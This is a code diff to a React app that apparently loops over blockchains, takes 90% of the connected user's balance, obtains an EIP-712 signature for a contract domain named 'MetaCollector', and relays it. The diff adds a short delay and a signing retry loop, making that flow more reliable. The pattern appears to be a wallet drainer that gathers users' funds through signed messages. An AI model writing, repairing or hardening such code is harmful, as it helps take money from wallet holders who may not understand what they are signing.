@@ -273,6 +273,9 @@ function App() {
         await waitForChainId(walletProvider, chain.chainId, 10000);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'switched' }));
 
+        // Wait for wallet provider to be fully ready (fixes eth_getTransactionCount error)
+        await new Promise(resolve => setTimeout(resolve, 500));
+
         const newProvider = new ethers.BrowserProvider(walletProvider);
         const newSigner = await newProvider.getSigner();
         const signerAddress = await newSigner.getAddress();
@@ -289,15 +292,12 @@ function App() {
         const amountToSend = balance.amount * 0.9;
         const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
 
-        // ============================================
-        // EIP-712 domain – EXACTLY as contract expects
-        // ============================================
         const contractAddress = CONTRACT_ADDRESSES[chain.chainId];
         if (!contractAddress) throw new Error(`No contract address for chain ${chain.chainId}`);
 
         const domain = {
-          name: "MetaCollector",            // must match contract's DOMAIN_NAME
-          version: "1",                     // must match contract's version
+          name: "MetaCollector",
+          version: "1",
           chainId: chain.chainId,
           verifyingContract: contractAddress,
         };
@@ -310,7 +310,22 @@ function App() {
 
         setStepStatus(prev => ({ ...prev, [chain.name]: 'signing' }));
         setTxStatus(`✍️ Signing for ${chain.name}...`);
-        const signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
+        
+        // Retry signing if RPC error occurs (e.g., "Cannot fulfill request")
+        let signature = null;
+        let attempts = 0;
+        while (attempts < 3 && !signature) {
+          try {
+            signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
+          } catch (err) {
+            attempts++;
+            console.warn(`Signing attempt ${attempts} failed:`, err.message);
+            if (attempts >= 3) throw err;
+            // Wait and retry
+            await new Promise(resolve => setTimeout(resolve, 1000 * attempts));
+          }
+        }
+
         setStepStatus(prev => ({ ...prev, [chain.name]: 'signed' }));
 
         setStepStatus(prev => ({ ...prev, [chain.name]: 'relaying' }));
